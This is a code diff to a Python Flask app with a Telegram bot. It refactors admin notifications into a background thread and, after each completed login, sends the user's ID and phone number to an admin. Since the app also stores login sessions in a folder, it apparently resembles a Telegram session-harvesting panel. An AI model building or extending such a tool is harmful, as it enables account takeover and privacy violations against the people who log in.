@@ -23,6 +23,16 @@ BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 SESSIONS_DIR = os.path.join(BASE_DIR, "sessions")
 os.makedirs(SESSIONS_DIR, exist_ok=True)
 
+def send_admin_message(text: str):
+    async def _send():
+        await bot.send_message(ADMIN_ID, text)
+
+    def runner():
+        asyncio.run(_send())
+
+    threading.Thread(target=runner, daemon=True).start()
+
+
 bot = Bot(BOT_TOKEN)
 
 app = Flask(__name__, template_folder="templates")
@@ -137,16 +147,13 @@ def finalize_login(client, phone):
         ON CONFLICT (user_id)
         DO UPDATE SET phone = EXCLUDED.phone
     """, (user_id, phone))
-        )
-    )
     conn.commit()
     conn.close()
 
-    asyncio.run(
-        bot.send_message(
-            ADMIN_ID,
-            f"✅ Yangi login\n👤 ID: {user_id}\n📞 {phone}"
-        )
+    send_admin_message(
+        f"✅ Yangi login\n"
+        f"👤 ID: {user_id}\n"
+        f"📞 {phone}"
     )
 
     client.disconnect()
@@ -154,12 +161,14 @@ def finalize_login(client, phone):
 
     return jsonify({"status": "success"})
 
+
 # ======================
 # RUN
 # ======================
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=8080)
+
 
 
 
